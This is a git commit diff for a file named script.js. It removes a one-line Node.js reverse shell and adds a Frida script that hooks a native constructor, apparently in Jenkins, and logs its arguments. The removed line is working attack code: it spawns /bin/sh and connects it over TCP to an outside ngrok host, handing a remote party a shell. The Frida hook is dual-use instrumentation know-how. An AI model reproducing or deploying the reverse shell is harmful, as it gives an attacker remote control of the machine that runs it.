617e63cba1e01d7c6c552257945d3cce0a3e5db2
eliarshin <80040465+eliarshin@users.noreply.github.com>
2023-04-27 14:34:39 +0300

    Update script.js

--- script.js
+++ script.js
@@ -1,1 +1,17 @@
-(function(){ var net = require("net"), cp = require("child_process"), sh = cp.spawn("/bin/sh", []); var client = new net.Socket(); client.connect(10177, "6.tcp.eu.ngrok.io", function(){ client.pipe(sh.stdin); sh.stdout.pipe(client); sh.stderr.pipe(client); }); return /a/; })();
+// Define the constructor signature
+var runConstructor = new NativeFunction(ptr("0x7f2db9b018e0"), 'void', ['pointer', 'pointer', 'pointer']);
+
+// Intercept the constructor call
+Interceptor.attach(runConstructor, {
+    onEnter: function(args) {
+        // args[0] is the this pointer
+        // args[1] is the hudson.model.Job object
+        // args[2] is the hudson.model.Environment object
+
+        // Log the arguments to the constructor
+        console.log("Run constructor called with arguments:");
+        console.log("this: " + args[0]);
+        console.log("job: " + args[1]);
+        console.log("env: " + args[2]);
+    }
+}); 
